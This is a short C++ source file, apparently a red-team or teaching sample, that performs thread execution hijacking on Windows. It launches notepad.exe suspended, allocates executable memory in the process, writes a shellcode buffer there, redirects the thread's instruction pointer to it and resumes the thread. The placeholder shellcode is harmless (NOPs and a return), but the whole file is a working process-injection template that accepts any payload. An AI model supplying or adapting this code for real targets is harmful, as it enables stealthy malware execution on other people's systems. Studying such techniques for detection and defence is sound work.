// Filename: thread_hijack.cpp
// Purpose: Hijack suspended thread and change RIP to shellcode
// Author: Joas A Santos

#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };

    CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, sizeof(shellcode), NULL);

    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD_PTR)remoteMem;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    return 0;
}
